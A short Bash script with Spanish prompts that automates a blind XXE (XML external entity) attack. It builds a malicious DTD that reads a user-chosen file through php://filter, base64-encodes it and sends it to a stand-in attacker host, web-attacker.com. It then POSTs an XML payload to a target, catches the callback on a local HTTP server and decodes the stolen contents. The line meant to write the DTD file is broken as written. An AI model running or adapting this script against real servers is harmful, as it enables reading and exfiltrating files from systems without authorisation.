#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  tput cnorm; exit 1
} 

#Ctrl+C 
trap ctrl_c SIGINT

tput civis
echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>\">
%eval;
%exfiltrate;"""
echo $malicious_dtd = malicious.dtd

python3 -m http.server 80 &>response &
PID=$!

sleep 1; echo

curl -s -X POST "http://example.com" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>' &>/dev/null
cat response | grep -oP "/?x=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
tput cnorm

